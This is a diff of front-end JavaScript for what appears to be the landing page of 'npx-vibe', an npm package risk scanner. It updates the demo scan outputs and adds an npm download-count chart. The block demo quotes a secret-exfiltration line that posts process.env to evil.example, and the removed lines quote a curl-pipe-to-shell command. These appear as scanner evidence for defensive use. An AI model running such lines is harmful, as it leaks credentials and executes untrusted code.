@@ -2,10 +2,13 @@ const demos = {
   proceed: `$ npx npx-vibe --check is-number
 ✓ npx-vibe: Proceed  risk 0/100
 is-number@7.0.0
+Returns true if a number or string value is a finite number.
 
-Downloads: 172,392,690/week  Package age: 11y
+Downloads: 171,615,366/week  Package age: 4293d  Version age: 2911d
 Install hooks: none
-Established signals: long registry history, high weekly adoption, linked GitHub repository
+Inspected: 1 selected file from 4 package files
+Established signals: long registry history, high weekly adoption,
+multiple maintainers, linked GitHub repository
 Registry popularity and age provide context, but never override code findings.
 AI review: skipped (No heuristic trigger required model review.)
 
@@ -13,37 +16,39 @@ Action: package may be executed.`,
   caution: `$ npx npx-vibe --check esbuild
 ! npx-vibe: Caution  risk 43/100
 esbuild@0.28.1
+An extremely fast JavaScript and CSS bundler and minifier.
 
 Downloads: 241,858,907/week  Package age: 3132d  Version age: 12d
 Install hooks: postinstall
-Established signals: long registry history, high weekly adoption, linked GitHub repository
-Registry popularity and age provide context, but never override code findings.
+Inspected: 3 selected files from 7 package files
+Established signals: long registry history, high weekly adoption,
+linked GitHub repository
 AI review: skipped (Heuristic-only mode; AI was not requested.)
 
 Findings:
-- MEDIUM lifecycle_hook in package.json
+- LOW      young_version
+  This version was published 12 days ago.
+- MEDIUM   lifecycle_hook in package.json
   postinstall runs: node install.js
   Evidence: postinstall: node install.js
-- MEDIUM network_and_shell in install.js
+- MEDIUM   network_and_shell in install.js
   Code combines network access with shell execution.
-  Evidence line 147: fetch(url) ... child_process.execSync(...)
+  Evidence line 147: function fetch(url) { ... https.get(url ...
+  Evidence line 187: child_process.execSync(\`npm install ...\`)
 
 Action: review recommended before execution.`,
-  block: `$ npx npx-vibe --check sketchy-helper
+  block: `# Synthetic malicious fixture from the npx-vibe test suite
 ✕ npx-vibe: Block  risk 100/100
-sketchy-helper@0.0.3
+fixture: install-time secret exfiltration
 
-Downloads: 12/week  Package age: <1d
 Install hooks: postinstall
 AI review: skipped (Heuristic-only mode; AI was not requested.)
 
 Findings:
-- CRITICAL possible_secret_exfiltration in setup.js
-  Code accesses environment secrets and performs network activity.
-  Evidence line 8: fetch(collector, { body: JSON.stringify(process.env) })
-- CRITICAL download_and_execute in postinstall.js
-  External content is piped to a shell.
-  Evidence line 3: curl payload.example | sh
+- CRITICAL possible_secret_exfiltration in postinstall.js
+  Code appears to access environment/secrets and perform network activity.
+  Evidence line 1: fetch('https://evil.example/collect',
+  { method: 'POST', body: JSON.stringify(process.env) })
 
 Action: blocked unless --force is supplied.`
 };
@@ -54,7 +59,11 @@ const tabs = document.querySelectorAll(".demo-tab");
 function setDemo(name) {
   if (!output || !demos[name]) return;
   output.textContent = demos[name];
-  tabs.forEach((tab) => tab.classList.toggle("active", tab.dataset.demo === name));
+  tabs.forEach((tab) => {
+    const active = tab.dataset.demo === name;
+    tab.classList.toggle("active", active);
+    tab.setAttribute("aria-selected", String(active));
+  });
 }
 
 tabs.forEach((tab) => {
@@ -67,9 +76,8 @@ document.querySelectorAll("[data-copy]").forEach((copyButton) => {
   const defaultText = copyButton.textContent;
 
   copyButton.addEventListener("click", async () => {
-    const text = copyButton.dataset.copy;
     try {
-      await navigator.clipboard.writeText(text);
+      await navigator.clipboard.writeText(copyButton.dataset.copy);
       copyButton.textContent = "Copied";
     } catch {
       copyButton.textContent = "Copy failed";
@@ -81,6 +89,111 @@ document.querySelectorAll("[data-copy]").forEach((copyButton) => {
   });
 });
 
+const DOWNLOAD_API = "https://api.npmjs.org/downloads/range/last-week/npx-vibe";
+const numberFormatter = new Intl.NumberFormat("en-US");
+const compactFormatter = new Intl.NumberFormat("en-US", { notation: "compact", maximumFractionDigits: 1 });
+const dateFormatter = new Intl.DateTimeFormat("en-US", { month: "short", day: "numeric", timeZone: "UTC" });
+
+async function loadDownloadMomentum() {
+  const status = document.querySelector("[data-download-status]");
+
+  try {
+    const response = await fetch(DOWNLOAD_API, { headers: { accept: "application/json" } });
+    if (!response.ok) throw new Error(`npm API returned ${response.status}`);
+
+    const payload = await response.json();
+    const days = Array.isArray(payload.downloads) ? payload.downloads.slice(-7) : [];
+    if (!days.length) throw new Error("npm API returned no daily data");
+
+    const total = days.reduce((sum, day) => sum + Number(day.downloads || 0), 0);
+    document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
+      animateNumber(element, total);
+      element.setAttribute("title", `${numberFormatter.format(total)} downloads from ${payload.start} through ${payload.end}`);
+    });
+
+    const windowText = formatDateWindow(payload.start, payload.end);
+    document.querySelectorAll("[data-download-window]").forEach((element) => {
+      element.textContent = windowText;
+    });
+
+    renderDownloadChart(days);
+    if (status) {
+      status.textContent = `npm API · ${compactFormatter.format(total)} total`;
+    }
+  } catch (error) {
+    if (status) status.textContent = "Live API unavailable · showing last known value";
+    document.querySelector("[data-download-dashboard]")?.classList.add("is-stale");
+    console.warn("Could not refresh npm download count:", error.message);
+  }
+}
+
+function animateNumber(element, target) {
+  const start = Number(String(element.textContent).replace(/,/g, "")) || 0;
+  if (window.matchMedia("(prefers-reduced-motion: reduce)").matches || start === target) {
+    element.textContent = numberFormatter.format(target);
+    return;
+  }
+
+  const startedAt = performance.now();
+  const duration = 750;
+  const tick = (now) => {
+    const progress = Math.min(1, (now - startedAt) / duration);
+    const eased = 1 - Math.pow(1 - progress, 3);
+    element.textContent = numberFormatter.format(Math.round(start + (target - start) * eased));
+    if (progress < 1) requestAnimationFrame(tick);
+  };
+  requestAnimationFrame(tick);
+}
+
+function renderDownloadChart(days) {
+  const line = document.querySelector("[data-chart-line]");
+  const area = document.querySelector("[data-chart-area]");
+  const pointsLayer = document.querySelector("[data-chart-points]");
+  const labels = document.querySelector("[data-chart-labels]");
+  if (!line || !area || !pointsLayer || !labels) return;
+
+  const width = 520;
+  const left = 20;
+  const top = 28;
+  const bottom = 155;
+  const max = Math.max(...days.map((day) => Number(day.downloads || 0)), 1);
+  const points = days.map((day, index) => {
+    const x = left + (width / Math.max(days.length - 1, 1)) * index;
+    const y = bottom - (Number(day.downloads || 0) / max) * (bottom - top);
+    return { x, y, day };
+  });
+
+  line.setAttribute("points", points.map(({ x, y }) => `${x.toFixed(1)},${y.toFixed(1)}`).join(" "));
+  area.setAttribute("d", `M${left} ${bottom} L${points.map(({ x, y }) => `${x.toFixed(1)} ${y.toFixed(1)}`).join(" L")} L${left + width} ${bottom} Z`);
+
+  pointsLayer.replaceChildren();
+  const svgNamespace = "http://www.w3.org/2000/svg";
+  points.forEach(({ x, y, day }) => {
+    const circle = document.createElementNS(svgNamespace, "circle");
+    circle.setAttribute("cx", x.toFixed(1));
+    circle.setAttribute("cy", y.toFixed(1));
+    circle.setAttribute("r", "5");
+    const title = document.createElementNS(svgNamespace, "title");
+    title.textContent = `${day.day}: ${numberFormatter.format(day.downloads)} downloads`;
+    circle.append(title);
+    pointsLayer.append(circle);
+  });
+
+  labels.replaceChildren(...days.map((day) => {
+    const label = document.createElement("span");
+    label.textContent = dateFormatter.format(new Date(`${day.day}T00:00:00Z`));
+    return label;
+  }));
+}
+
+function formatDateWindow(start, end) {
+  const startDate = new Date(`${start}T00:00:00Z`);
+  const endDate = new Date(`${end}T00:00:00Z`);
+  return `${dateFormatter.format(startDate)}–${dateFormatter.format(endDate)}, ${endDate.getUTCFullYear()}`;
+}
+
+loadDownloadMomentum();
+
 const observer = new IntersectionObserver(
   (entries) => {
     entries.forEach((entry) => {
@@ -90,7 +203,7 @@ const observer = new IntersectionObserver(
       }
     });
   },
-  { threshold: 0.16 }
+  { threshold: 0.14 }
 );
 
 document.querySelectorAll(".reveal").forEach((element) => observer.observe(element));
